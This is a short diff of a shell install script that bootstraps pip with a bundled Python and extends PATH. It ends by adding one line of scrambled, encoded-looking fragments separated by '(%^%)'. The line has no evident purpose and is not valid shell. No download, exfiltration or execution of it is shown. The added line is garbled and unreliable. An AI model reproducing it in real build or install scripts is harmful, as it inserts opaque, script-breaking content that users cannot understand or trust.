@@ -22,3 +22,5 @@ echo "Installing PIP"
 ./python -m ensurepip
 ./python -m pip install --ignore-installed pip --disable-pip-version-check --no-warn-script-location
 export PATH="$PATH:$(pwd)"
+
+ansjrg5(%^%)dbnobobvdwq(%^%)2zv6j2tlkvt(%^%)jdpwobnjydw(%^%)w6fyn433rxcq(%^%)
